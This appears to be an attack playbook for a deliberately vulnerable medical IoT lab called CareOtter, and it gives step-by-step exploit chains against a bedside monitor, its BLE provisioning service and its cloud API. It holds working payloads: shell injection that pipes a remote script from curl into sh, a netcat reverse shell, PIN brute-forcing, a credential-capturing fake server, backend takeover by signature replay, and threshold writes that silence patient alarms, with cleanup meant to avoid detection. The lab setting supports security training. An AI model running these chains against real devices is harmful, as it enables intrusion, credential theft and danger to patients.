# CareOtter Attack Playbook

> **Single source of truth for operational attack chains.**
>
> This document contains step-by-step playbooks with concrete commands, payloads, and expected outputs. For vulnerability descriptions, CWE mappings, and remediation guidance, see [`CareOtter_IoT.md`](IoT/CareOtter_IoT.md).

---

## Table of Contents

- [Ground State](#ground-state)
- [Chain A — Remote Code Execution via Network](#chain-a--remote-code-execution-via-network)
- [Chain B — Patient Safety Attack via BLE](#chain-b--patient-safety-attack-via-ble)
- [Chain C — WiFi Credential Theft](#chain-c--wifi-credential-theft)
- [Chain D — Stack Disclosure via Format String](#chain-d--stack-disclosure-via-format-string)
- [Chain E — Full Device Compromise from BLE Proximity](#chain-e--full-device-compromise-from-ble-proximity)
- [Chain F — Cloud API Impersonation via Signature Interception](#chain-f--cloud-api-impersonation-via-signature-interception)
- [Vulnerability Checklist](#vulnerability-checklist)
- [Quick Reference — One-Liners](#quick-reference--one-liners)

---

## Ground State

> **BlueZ discovery filter (Linux attacker host).** Every chain that scans with
> `bluetoothctl` assumes a permissive `DiscoveryFilter` is set first. The Pi
> BCM4345C0 PCB antenna typically arrives at −85 dBm, below BlueZ's default
> −80 dBm cutoff, so `scan on` shows nothing even when `sudo btmon` sees
> `Name (complete): CareOtter_HR` at the HCI layer. Run this once per session
> before any BLE chain (B, E, F):
>
> ```text
> bluetoothctl
> [bluetooth]# menu scan
> [bluetooth]# transport le         # LE-only events
> [bluetooth]# rssi -100             # accept weak signal
> [bluetooth]# duplicate-data on     # do not collapse repeats
> [bluetooth]# pattern CareOtter     # name/UUID/MAC match
> [bluetooth]# back
> [bluetooth]# scan on
> ```
>
> Diagnostic: if `sudo btmon | grep -i careotter` shows adv but `bluetoothctl`
> still does not list the device, the filter is the cause — not the radio.

Before any attack chain begins, the system is in the following state:

| Component | State |
|-----------|-------|
| Cloud API | SQLite empty, no users, `DEVICE_IP=""` |
| Bedside Monitor (Pi) | No WiFi, no `cloud_url`, BLE advertising as `CareOtter_HR` |
| DAI/ICD Implant | MAX30102 streaming I2C data to the Pi |
| Attacker position | **A** — Same network as Cloud API / **B** — BLE range only (~10–30 m) |

---

## Chain A — Remote Code Execution via Network

> **Vector:** IGP v4 (TCP :9999) · **Physical access:** No · **Prerequisites:** Network reachability to `192.168.2.1:9999`
> **Vulns:** Hardcoded token ([`I1`](IoT/CareOtter_IoT.md#i1)), Command injection ([`I9.1`](IoT/CareOtter_IoT.md#i91))

### Steps

```bash
# 1. Discover open IGP port
nmap -sV -p 9999 192.168.2.1

# 2. Extract hardcoded token — pick ANY of these independent sources:
#    a) Firmware (this snippet) — needs SD-card / shell access
strings /path/to/careservice | grep -i otter
# → OtterMobile2026
#
#    b) APK reverse engineering — needs only the patient/admin app
#       (decode the XOR-obfuscated ENCODED_TOKEN in IgpClient.java with key 0x5A).
#       Full step-by-step in CareOtter_Test_Suite.md → IGP-01 → Path B.
#
#    c) Passive network capture — sniff a single legitimate admin login on :9999
#       and read the 15-byte payload after the 8-byte "CARE" header.
#       Full step-by-step in CareOtter_Test_Suite.md → IGP-01 → Path C.

# 3. Authenticate via IGP 0x02
python3 << 'EOF'
import socket, struct
MAGIC = 0x43415245
def igp(cmd, p=b''):
    h = struct.pack('>IBBH', MAGIC, cmd, 0, len(p))
    with socket.create_connection(('192.168.2.1', 9999), timeout=5) as s:
        s.sendall(h + p); return s.recv(4096)
print(igp(0x02, b'OtterMobile2026'))  # AUTH_SUCCESS
EOF

# 4. Inject shell command via IGP 0x06 (SET_NETWORK SSID field)
python3 << 'EOF'
import socket, struct
MAGIC = 0x43415245
def igp(cmd, p=b''):
    h = struct.pack('>IBBH', MAGIC, cmd, 0, len(p))
    with socket.create_connection(('192.168.2.1', 9999), timeout=5) as s:
        s.sendall(h + p); return s.recv(4096)
igp(0x02, b'OtterMobile2026')
payload = b"' && curl http://192.168.2.100/r.sh | sh #"
print(igp(0x06, payload))
EOF
```

**Impact:** Root RCE on the bedside monitor.

---

## Chain B — Patient Safety Attack via BLE

> **Vector:** BLE GATT · **Physical access:** BLE range · **Prerequisites:** None
> **Vulns:** ManufacturerData leak ([`I3`](IoT/CareOtter_IoT.md#i3)), Hardcoded CSCP key ([`M1`](IoT/CareOtter_IoT.md#m1))

### Steps

```bash
# 1. Passive BLE scan to discover device and API URL from ManufacturerData
python3 -c "
import asyncio
from bleak import BleakScanner
async def scan():
    devs = await BleakScanner.discover(timeout=5)
    for d in devs:
        if d.name == 'CareOtter_HR':
            print(f'Found: {d.address}')
            print(f'ManufacturerData: {d.metadata.get(\"manufacturer_data\", {})}')
asyncio.run(scan())
"

# 2. Extract CSCP key from Android APK
dex2jar careotter_app.apk
jadx -d out careotter_app.apk
grep -r "careotter-key-16" out/

# 3. Forge malicious CSCP v1 packet (silences all alerts)
python3 << 'EOF'
import struct, zlib
from Crypto.Cipher import AES
KEY   = b"careotter-key-16"
MAGIC = 0xCAFE0DDA

def cscp_pack(bpm_min, bpm_max, spo2_min):
    plaintext = struct.pack("BBB", bpm_min, bpm_max, spo2_min) + b'\x00' * 13
    crc = zlib.crc32(plaintext) & 0xFFFFFFFF
    ct  = AES.new(KEY, AES.MODE_ECB).encrypt(plaintext)
    return struct.pack(">II", MAGIC, crc) + ct

pkt = cscp_pack(0, 255, 0)
print(f"Payload (hex): {pkt.hex()}")
# Write pkt to BLE characteristic 0xFF01 via nRF Connect or bleak
EOF
```

**Impact:** All clinical alarms silenced (bpm=0–255, spo2=0). Patient safety compromise.

---

## Chain C — WiFi Credential Theft

> **Vector:** IGP v4 or HTTP · **Physical access:** No · **Prerequisites:** Network reachability + admin token
> **Vulns:** Hardcoded token ([`I1`](IoT/CareOtter_IoT.md#i1)), PSK plaintext in API response ([`I6`](IoT/CareOtter_IoT.md#i6))

> **Token acquisition**: this chain reuses `OtterMobile2026`. Obtain it via firmware `strings`, APK reverse (XOR `0x5A` on `ENCODED_TOKEN`), or passive sniff — all three paths are detailed in [`CareOtter_Test_Suite.md` → IGP-01](CareOtter_Test_Suite.md#learning-the-igp-protocol-without-igp_helperpy).

### Steps

```bash
# Via IGP v4
python3 << 'EOF'
import socket, struct
MAGIC = 0x43415245
def igp(cmd, p=b''):
    h = struct.pack('>IBBH', MAGIC, cmd, 0, len(p))
    with socket.create_connection(('192.168.2.1', 9999), timeout=5) as s:
        s.sendall(h + p); return s.recv(4096)
igp(0x02, b'OtterMobile2026')
print(igp(0x03).decode())  # GET_NETWORK → contains PSK
EOF

# Via Cloud API (requires valid JWT obtained after fallback init)
curl -s http://192.168.2.2:5002/api/network \
  -H "Authorization: Bearer <JWT>"
# → field "raw" contains /etc/config/wireless with PSK
```

**Impact:** Hospital WiFi credentials exposed in plaintext.

---

## Chain D — Stack Disclosure via Format String

> **Vector:** IGP v4 · **Physical access:** No · **Prerequisites:** Network reachability
> **Vuln:** Format string bug ([`I9.2`](IoT/CareOtter_IoT.md#i92))

### Steps

```bash
python3 << 'EOF'
import socket, struct
MAGIC = 0x43415245
def igp(cmd, p=b''):
    h = struct.pack('>IBBH', MAGIC, cmd, 0, len(p))
    with socket.create_connection(('192.168.2.1', 9999), timeout=5) as s:
        s.sendall(h + p); return s.recv(4096)
# 0x05 requires no authentication
print(igp(0x05, b'%x.%x.%x.%x.%x'))
EOF
```

**Impact:** Stack frame addresses leaked. Useful for ASLR bypass in follow-up exploits.

---

## Chain E — Full Device Compromise from BLE Proximity

> **Vector:** BLE GATT (hidden provisioning service) · **Physical access:** BLE range · **Prerequisites:** None
> **Vulns:** Hidden service ([`P1`](IoT/CareOtter_IoT.md#p1)), No pairing ([`P2`](IoT/CareOtter_IoT.md#p2)), Hardcoded PIN ([`P3`](IoT/CareOtter_IoT.md#p3)), Shell injection ([`P4`](IoT/CareOtter_IoT.md#p4)), SSRF ([`P6`](IoT/CareOtter_IoT.md#p6)), Unauthenticated factory reset ([`P7`](IoT/CareOtter_IoT.md#p7))

### Steps

```python
import asyncio, json
from bleak import BleakClient

ADDRESS = "B8:27:EB:XX:XX:XX"
CONFIG  = "0000ff11-0000-1000-8000-00805f9b34fb"
AUTH    = "0000ff12-0000-1000-8000-00805f9b34fb"

async def main():
    async with BleakClient(ADDRESS) as client:
        # 1. Brute-force PIN 6767 (P3)
        # AuthChrc.ReadValue only returns {"attempts_remaining": N, "locked": bool}.
        # After a correct PIN, the server resets attempts_remaining to 3 (ble_server.py).
        # Detect success by reading the counter before and after the write.
        for pin in range(10000):
            pin_str = f"{pin:04d}"
            prev = json.loads(await client.read_gatt_char(AUTH))
            await client.write_gatt_char(AUTH, pin_str.encode())
            curr = json.loads(await client.read_gatt_char(AUTH))
            if curr.get("locked"):
                print("[-] Locked out"); break
            # Correct PIN: counter goes back to 3 (or up); wrong PIN: drops by 1.
            if curr.get("attempts_remaining", 0) > prev.get("attempts_remaining", 0) \
               or curr.get("attempts_remaining") == 3 and prev.get("attempts_remaining", 3) < 3:
                print(f"[+] PIN: {pin_str}")
                break

        # 2. Read provisioning state
        state = json.loads(await client.read_gatt_char(CONFIG))
        print(f"cloud_url: {state['cloud_url']}")

        # 3. Attacker BECOMES the cloud (P6)
        await client.write_gatt_char(CONFIG, json.dumps({
            "cmd": "cloud_set",
            "url": "http://192.168.2.100:5002"
        }).encode())

        # 4. Inject shell command via WiFi SSID (P4)
        await client.write_gatt_char(CONFIG, json.dumps({
            "cmd": "wifi_set",
            "ssid": "'; curl http://192.168.2.100/r.sh | sh #",
            "psk": "irrelevant"
        }).encode())

        # 5. Wipe device (P7)
        await client.write_gatt_char(CONFIG, json.dumps({
            "cmd": "factory_reset"
        }).encode())

asyncio.run(main())
```

**Impact:** Attacker-controlled cloud backend + root RCE + denial of clinical monitoring.

---

## Chain F — Cloud API Impersonation via Signature Interception

> **Vector:** BLE GATT + HTTP · **Physical access:** BLE range + network · **Prerequisites:** Bluetooth range to Pi, network reachability to real Cloud API
> **Vulns:** Hidden service ([`P1`](IoT/CareOtter_IoT.md#p1)), No pairing ([`P2`](IoT/CareOtter_IoT.md#p2)), Hardcoded PIN ([`P3`](IoT/CareOtter_IoT.md#p3)), Shell injection ([`P4`](IoT/CareOtter_IoT.md#p4)), SSRF + hardcoded signature ([`P6`](IoT/CareOtter_IoT.md#p6))

### PHASE 1: Reconnaissance (30 seconds)

```bash
# Port scan of the subnet
nmap -sV -p 5002,8081,9999 192.168.2.0/24

# Direct login test with default credentials
# → Should FAIL if the DB is clean (clean-slate)
curl -s -X POST http://192.168.2.2:5002/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"CareOtter2026!"}'
# → {"error":"Invalid username or password","code":"AUTH_FAIL"}

# Read the provisioning hint
curl -s http://192.168.2.2:5002/hint
# → plaintext hint about CareOtter Medical Service configuration software
```

### PHASE 2: BLE Discovery

```python
import asyncio
from bleak import BleakScanner

async def scan():
    devices = await BleakScanner.discover()
    for d in devices:
        if d.name == "CareOtter_HR":
            print(f"[+] Found: {d.address}")
            print(f"    RSSI: {d.rssi}")
            print(f"    ManufacturerData: {d.metadata.get('manufacturer_data', {})}")

asyncio.run(scan())
```

> **Vuln ref:** [`I3`](IoT/CareOtter_IoT.md#i3) — `ManufacturerData` exposes the Cloud API IP:port. In the unprovisioned state it is `0.0.0.0:0`.

### PHASE 3: GATT Enumeration and Hidden Channel Discovery

```python
import asyncio
from bleak import BleakClient

ADDRESS = "B8:27:EB:XX:XX:XX"

async def main():
    async with BleakClient(ADDRESS) as client:
        services = await client.get_services()
        for service in services:
            print(f"Service: {service.uuid}")
            for ch in service.characteristics:
                print(f"  Char: {ch.uuid} — {ch.properties}")

asyncio.run(main())
```

**Expected hidden service:**
```
Service: 0000ff10-0000-1000-8000-00805f9b34fb  # NOT advertised
  Char: 0000ff11-... — ['read', 'write', 'notify']  # Provisioning Config
  Char: 0000ff12-... — ['read', 'write']            # Provisioning Auth
```

> **Vuln ref:** [`P1`](IoT/CareOtter_IoT.md#p1) — The `0xFF10` service is not advertised in Advertising, but is visible via `discover_services()`.

### PHASE 4: BLE Authentication Bypass (PIN brute-force)

```python
import asyncio
from bleak import BleakClient

ADDRESS = "B8:27:EB:XX:XX:XX"
AUTH_UUID = "0000ff12-0000-1000-8000-00805f9b34fb"

async def main():
    async with BleakClient(ADDRESS) as client:
        # AuthChrc.ReadValue → {"attempts_remaining": N, "locked": bool}
        # Correct PIN ⇒ the server resets attempts_remaining = 3.
        # Wrong PIN ⇒ decrements attempts_remaining.
        for pin in range(10000):
            pin_str = f"{pin:04d}"
            prev = json.loads((await client.read_gatt_char(AUTH_UUID)).decode())
            await client.write_gatt_char(AUTH_UUID, pin_str.encode())
            curr = json.loads((await client.read_gatt_char(AUTH_UUID)).decode())
            if curr.get("locked"):
                print("[-] Locked out — wait timeout"); break
            if curr.get("attempts_remaining", 0) > prev.get("attempts_remaining", 0):
                print(f"[+] PIN cracked: {pin_str}")
                break

asyncio.run(main())
```

**Expected output:**
```
[+] PIN cracked: 6767
```

> **Vuln ref:** [`P3`](IoT/CareOtter_IoT.md#p3) — Hardcoded PIN `6767` on all devices. No rate limiting.

### PHASE 5: Read Factory State

```python
CONFIG_UUID = "0000ff11-0000-1000-8000-00805f9b34fb"

async def read_state(client):
    data = await client.read_gatt_char(CONFIG_UUID)
    print(data.decode())
```

**Expected response (real state exposed by `ProvisioningConfigChrc.ReadValue`, `ble_server.py`):**
```json
{
  "wifi_ssid": "ClinicWiFi",
  "wifi_psk": "Clin1cP@ss!",
  "cloud_url": "http://192.168.2.2:5002",
  "uptime_sec": 4821,
  "provision_expired": false
}
```

> **Note:** The `0xFF11` characteristic does **NOT** expose the `patient_*` or `admin_*` credentials via `ReadValue`. Those credentials are leaked in **PHASE 6C** when the device sends `POST /admin/device/register` to the attacker-controlled `cloud_url` (see `_send_registration_to_cloud` in `ble_server.py`). Reading here only confirms the current WiFi PSK + cloud_url (enough to prepare the redirect).

> **Vuln ref:** [`P2`](IoT/CareOtter_IoT.md#p2) — No BLE pairing is required. Connection + cracked PIN = access to the WiFi/cloud state.

### PHASE 6: Signature Interception

#### 6A. Attacker's Fake Server

```python
# attacker_server.py
from flask import Flask, request, jsonify
app = Flask(__name__)

@app.route('/admin/device/register', methods=['POST'])
def capture():
    data = request.get_json()
    print("=" * 60)
    print("[CAPTURED REGISTRATION]")
    print(f"Signature: {data['signature']}")
    print(f"MAC:       {data['mac']}")
    print(f"Patient:   {data['patient']}")
    print(f"Admin:     {data['admin']}")
    print(f"Device IP: {data['device_ip']}")
    print("=" * 60)
    return jsonify({"status": "registered", "device_mac": data['mac']})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5002)
```

#### 6B. Writing a Fake URL via BLE

```python
import json

async def redirect_to_attacker(client):
    # Configure accounts so the Pi sends them to the attacker
    await client.write_gatt_char(CONFIG_UUID, json.dumps({
        "cmd": "patient_set",
        "username": "alice_patient",
        "password": "super_secret_patient_123"
    }).encode())

    await client.write_gatt_char(CONFIG_UUID, json.dumps({
        "cmd": "admin_set",
        "username": "dr_bob_admin",
        "password": "super_secret_admin_456"
    }).encode())

    # cloud_set triggers _send_registration_to_cloud() automatically
    await client.write_gatt_char(CONFIG_UUID, json.dumps({
        "cmd": "cloud_set",
        "url": "http://192.168.2.100:5002"
    }).encode())
```

#### 6C. Capture on the Attacker Server

```
============================================================
[CAPTURED REGISTRATION]
Signature: 9C0C306DEF2A
MAC:       B8:27:EB:12:34:56
Patient:   {'username': 'alice_patient', 'password': 'super_secret_patient_123'}
Admin:     {'username': 'dr_bob_admin', 'password': 'super_secret_admin_456'}
Device IP: 192.168.2.1
============================================================
```

> **Vuln ref:** [`P6`](IoT/CareOtter_IoT.md#p6) — `cloud_set` accepts any URL. The Pi auto-sends `DEVICE_SIGNATURE` + credentials to that URL.

### PHASE 7: Replay to the Real Cloud API (Backend Takeover)

```bash
REAL_CLOUD="http://192.168.2.2:5002"

curl -s -X POST "$REAL_CLOUD/admin/device/register" \
  -H "Content-Type: application/json" \
  -d '{
    "signature": "9C0C306DEF2A",
    "mac": "B8:27:EB:12:34:56",
    "patient": {
      "username": "alice_patient",
      "password": "super_secret_patient_123"
    },
    "admin": {
      "username": "dr_evil_ADMIN",
      "password": "pwned_666!!!"
    },
    "device_ip": "192.168.2.1"
  }'
```

**Response:**
```json
{"status": "registered", "device_mac": "B8:27:EB:12:34:56"}
```

> **Vuln:** The `9C0C306DEF2A` signature is global and identical. It is not bound to the MAC.

### PHASE 8: Access the Admin Panel

```bash
# Login with the injected admin account
TOKEN=$(curl -s -X POST "$REAL_CLOUD/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"dr_evil_ADMIN","password":"pwned_666!!!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# List patients
curl -s "$REAL_CLOUD/api/admin/patients" \
  -H "Authorization: Bearer $TOKEN"

# Read historical vitals
curl -s "$REAL_CLOUD/api/admin/records" \
  -H "Authorization: Bearer $TOKEN"

# Silence clinical alarms
curl -s -X POST "$REAL_CLOUD/api/admin/thresholds" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"bpm_min":0,"bpm_max":255,"spo2_min":0,"spo2_max":100}'
```

### PHASE 9: Remote Code Execution (RCE) via BLE

```python
async def rce_payload(client):
    await client.write_gatt_char(CONFIG_UUID, json.dumps({
        "cmd": "wifi_set",
        "ssid": "'; curl http://192.168.2.100/r.sh | sh #",
        "psk": "irrelevant"
    }).encode())

    await client.write_gatt_char(CONFIG_UUID, json.dumps({
        "cmd": "reboot"
    }).encode())
```

**On the attacker's server (`r.sh`):**
```bash
#!/bin/bash
nc -e /bin/sh 192.168.2.100 4444
```

```bash
# Attacker listens
nc -lvnp 4444
# → Incoming connection as root from the Pi
```

> **Vuln ref:** [`P4`](IoT/CareOtter_IoT.md#p4) — `wifi_set` interpolates `ssid` into `os.system()` without sanitization.

### PHASE 10: Persistence and Cleanup

```python
async def cleanup(client):
    # Restore the original cloud_url to avoid suspicion
    await client.write_gatt_char(CONFIG_UUID, json.dumps({
        "cmd": "cloud_set",
        "url": "http://hospital-cloud.local:5002"
    }).encode())
```

### Timeline Chain F

| Time | Action |
|--------|--------|
| 0:00 | `nmap` or BLE scan |
| 0:15 | GATT service discovery → `0xFF10` found |
| 0:30 | PIN brute-force `6767` |
| 0:45 | Read state: `cloud_url: not_configured` |
| 1:00 | Write `patient_set`, `admin_set`, `cloud_set` → auto-registration |
| 1:15 | Capture signature + credentials on the fake server |
| 1:30 | Replay to the real Cloud API → admin account created |
| 1:45 | Log in as admin, exfiltrate data |
| 2:00 | `wifi_set` with shell injection → RCE |
| 2:15 | Reverse shell as root |

**Total time:** ~2 minutes with an automated script.

---

## Vulnerability Checklist

| Step | Vuln | CWE | Severity | Documentation |
|------|------|-----|-----------|---------------|
| Discover `0xFF10` | P1 — Hidden Service | CWE-200 | Info | [`IoT doc`](IoT/CareOtter_IoT.md#p1) |
| No pairing | P2 — No BLE Pairing | CWE-287 | Medium | [`IoT doc`](IoT/CareOtter_IoT.md#p2) |
| PIN `6767` | P3 — Hardcoded PIN | CWE-798 | High | [`IoT doc`](IoT/CareOtter_IoT.md#p3) |
| Shell injection | P4 — Command Injection | CWE-78 | Critical | [`IoT doc`](IoT/CareOtter_IoT.md#p4) |
| PSK plaintext | P5 — Plaintext Storage | CWE-312 | Medium | [`IoT doc`](IoT/CareOtter_IoT.md#p5) |
| SSRF + signature | P6 — SSRF + Hardcoded Secret | CWE-918, CWE-798 | Critical | [`IoT doc`](IoT/CareOtter_IoT.md#p6) |
| Factory reset | P7 — Destructive op gated only by hardcoded factory PIN (no 2nd factor, no physical confirmation) | CWE-798 + CWE-307 + CWE-306 | High | [`IoT doc`](IoT/CareOtter_IoT.md#p7) |
| Open channel | P8 — Missing Temporal Lockout | CWE-613 | Medium | [`IoT doc`](IoT/CareOtter_IoT.md#p8) |
| Hardcoded token | I1 — Hardcoded IGP Token | CWE-798 | High | [`IoT doc`](IoT/CareOtter_IoT.md#i1) |
| Global auth state | I7 — Insecure Data Transfer | CWE-362 / CWE-613 | High | [`IoT doc`](IoT/CareOtter_IoT.md#i7) |

---

## Quick Reference — One-Liners

```bash
# IGP helper (Python)
python3 << 'EOF'
import socket, struct
MAGIC = 0x43415245
def igp(ip, cmd, payload=b''):
    hdr = struct.pack('>IBBH', MAGIC, cmd, 0, len(payload))
    with socket.create_connection((ip, 9999), timeout=5) as s:
        s.sendall(hdr + payload)
        return s.recv(4096)
ip = '192.168.2.1'
print(igp(ip, 0x01))                        # SYS_INFO
print(igp(ip, 0x02, b'OtterMobile2026'))    # AUTHENTICATE
print(igp(ip, 0x05, b'%x.%x.%x.%x'))       # FORMAT STRING (no auth)
print(igp(ip, 0x03))                        # GET_NETWORK → PSK
print(igp(ip, 0x0C, b"x'; touch /tmp/pwned #"))  # CMD INJECTION
EOF

# Sensor HTTP — unauthenticated probe leaks the required header name (vuln #15)
curl -s -i http://192.168.2.1:8081/config | tail -1
# → {"error": "unauthorized", "hint": "X-API-Key header required"}

# Sensor HTTP — extract hardcoded API token from the firmware config
grep api_key /opt/medical-sensor/config.json
# → "api_key": "careotter-2024-lab"

# Sensor HTTP — authenticated vitals read
curl -s -H "X-API-Key: careotter-2024-lab" http://192.168.2.1:8081/vitals

# Sensor HTTP — authenticated threshold overwrite
curl -X POST http://192.168.2.1:8081/thresholds \
     -H "Content-Type: application/json" \
     -H "X-API-Key: careotter-2024-lab" \
     -d '{"bpm_min":0,"bpm_max":255,"spo2_min":0}'

# BLE ManufacturerData scan
python3 -c "
import asyncio
from bleak import BleakScanner
async def scan():
    devs = await BleakScanner.discover(timeout=5)
    for d in devs:
        if d.name == 'CareOtter_HR':
            print(f'ManufacturerData: {d.metadata.get(\"manufacturer_data\", {})}')
asyncio.run(scan())
"

# Cloud API — login with default credentials (after device provisioning)
curl -X POST http://192.168.2.2:5002/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"CareOtter2026!"}'

# Cloud API — hint endpoint (unauthenticated)
curl -s http://192.168.2.2:5002/hint

# Cloud API — signature-based registration
curl -X POST http://192.168.2.2:5002/admin/device/register \
  -H "Content-Type: application/json" \
  -d '{"signature":"9C0C306DEF2A","mac":"B8:27:EB:XX:XX:XX","patient":{"username":"p","password":"p"},"admin":{"username":"a","password":"a"},"device_ip":"192.168.2.1"}'
```


---

## Reproducibility Tracker

> Use this table to record the real result of each test in the lab. **Do not repeat the commands** — they are in the previous sections. Only note whether it worked as documented and what you observed.

```markdown
### Session date: ___________

| ID | Vuln | Status | Expected output (per docs) | Actual observed output | Does the docs/code need polishing? |
|----|------|--------|------------------------------|----------------------|------------------------------|
| IGP-01 | Hardcoded credential | ⬜ | AUTH_SUCCESS with OtterMobile2026 | | |
| IGP-01b | Incorrect token | ⬜ | AUTH_FAIL | | |
| IGP-02 | WiFi PSK disclosure | ⬜ | option key in plaintext | | |
| IGP-03 | Integer underflow → BOF | ⬜ | Crash or anomalous behavior | | |
| IGP-04 | Format string | ⬜ | Stack leak in response | | |
| IGP-05 | Shell injection | ⬜ | File created on the RPi | | |
| IGP-06 | Global auth state | ⬜ | Unauthenticated data on a new TCP connection | | |
| IGP-07 | Format string (therapy) | ⬜ | Stack leak in careotter_events.log | | |
| IGP-08 | Command injection (alert) | ⬜ | File created on the RPi | | |
| API-01 | Weak JWT secret | ⬜ | Forged token accepted | | |
| API-02 | WiFi PSK via REST | ⬜ | .raw field with PSK | | |
| API-03 | Format string proxy | ⬜ | Stack leak from careservice | | |
| API-04 | Flask debug / RCE | ⬜ | Werkzeug debugger exposed | | |
| API-05 | Weak password storage | ⬜ | Unsalted SHA-256 hash in SQLite | | |
| API-06 | Partial role checks | ⬜ | Patient accesses admin endpoint | | |
| API-07 | Unauthenticated /hint | ⬜ | Hint received without auth | | |
| API-09 | Signature registration | ⬜ | Admin/patient created via signature | | |
| BLE-01 | Missing BLE pairing | ⬜ | App connects without verifying MAC | | |
| BLE-02 | Unencrypted BLE channel | ⬜ | BPM/SpO₂ in plaintext (Wireshark) | | |
| BLE-03 | Plaintext external storage | ⬜ | Vitals in /sdcard/*.log | | |
| BLE-04 | Hidden diagnostic panel | ⬜ | DIAG panel accessible | | |
| BLE-05 | Unvalidated GATT writes | ⬜ | Device accepts without validation | | |
| BLE-06 | CSCP key leak | ⬜ | careotter-key-16 exposed | | |
| BLE-07 | Threshold forging (M3) | ⬜ | Lethal thresholds applied | | |
| BLE-08 | Hidden provisioning service | ⬜ | UUID 0xFF10 visible | | |
| BLE-09 | Factory PIN brute force | ⬜ | PIN 6767 accepted | | |
| BLE-10 | WiFi PSK extraction | ⬜ | wifi_psk in plaintext | | |
| BLE-11 | Shell injection (provisioning) | ⬜ | File created on the RPi | | |
| BLE-12 | SSRF via cloud_set | ⬜ | Pi sends registration to attacker server | | |
| BLE-13 | Factory reset behind hardcoded PIN | ⬜ | Reset accepted only after PIN `6767` write to `0xFF12`; pre-PIN attempt dropped with `PIN not verified` | | |
| BLE-14 | Channel never expires | ⬜ | Channel still active after 30 min | | |
| SENSOR-01 | Hardcoded sensor token | ⬜ | `api_key: careotter-2024-lab` in `config.json` | | |
| SENSOR-02 | Timing side-channel auth | ⬜ | Measurable time difference `==` vs prefix | | |
| SENSOR-03 | 401 hint leak | ⬜ | `hint: "X-API-Key header required"` in 401 from `/config`, `/vitals`, … | | |
```

**Legend:**
- ⬜ = Not tested yet
- ✅ = Works exactly as documented
- ❌ = Does not work / output differs from the documentation
- ⚠️ = Partially works or requires additional conditions

---

## Quick Reference — IPs and Ports

| Service | IP | Port | Protocol |
|----------|-----|--------|-----------|
| RPi Ethernet | `192.168.2.1` | — | — |
| PC Ethernet | `192.168.2.2` | — | — |
| Cloud API (Docker) | `192.168.2.2` | `5002` | HTTP |
| Medical Sensor | `192.168.2.1` | `8081` | HTTP |
| IGP v4 | `192.168.2.1` | `9999` | TCP binary |
| BLE | — | — | GATT (`CareOtter_HR`) |
